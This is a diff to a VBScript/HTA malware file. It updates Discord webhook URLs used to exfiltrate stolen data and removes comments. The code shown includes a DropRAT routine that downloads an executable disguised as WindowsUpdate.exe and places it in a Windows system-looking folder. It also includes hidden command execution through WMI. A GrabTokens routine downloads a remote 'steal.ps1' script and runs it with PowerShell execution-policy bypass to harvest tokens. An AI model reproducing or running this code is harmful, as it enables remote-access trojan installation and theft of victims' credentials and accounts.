@@ -11,8 +11,8 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOKS ---
-WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
-RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
+WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
+RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -47,9 +47,8 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Standard Download to Disk + Execute) ---
+' --- RAT DROP ---
 Sub DropRAT(targetWH, sendRocket)
-    ' UPDATED RAT LINK
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
@@ -80,7 +79,7 @@ Sub DropRAT(targetWH, sendRocket)
     End If
 End Sub
 
-' --- RunCmd (Hidden Execution via WMI) ---
+' --- RunCmd ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -208,12 +207,10 @@ End Sub
 ' --- GrabTokens ---
 Sub GrabTokens(targetWH)
     Dim tf : tf = TmpFile("steal_result.txt")
-    ' Delete old result file BEFORE running to prevent append duplicates
     If fso.FileExists(tf) Then fso.DeleteFile tf, True
 
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    ' UPDATED GIST LINK
     xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/fee8e25e4712366648a7bd58e63bae83c1183883/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
@@ -225,7 +222,6 @@ Sub GrabTokens(targetWH)
     WriteFile psf, pc
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
     
-    ' Wait for file to be written
     Call SleepSeconds(8)
     
     If Not fso.FileExists(tf) Then Exit Sub
